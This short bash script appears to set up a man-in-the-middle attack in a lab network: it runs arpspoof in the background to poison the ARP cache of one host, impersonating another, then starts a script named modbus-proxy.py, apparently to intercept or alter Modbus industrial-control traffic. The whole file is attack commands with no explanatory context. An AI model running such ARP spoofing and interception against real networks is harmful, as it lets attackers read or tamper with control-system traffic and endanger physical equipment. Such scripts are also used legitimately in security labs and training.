#/usr/bin/env bash

nohup arpspoof -t 172.16.238.10 172.16.238.11 &
python3 modbus-proxy.py &
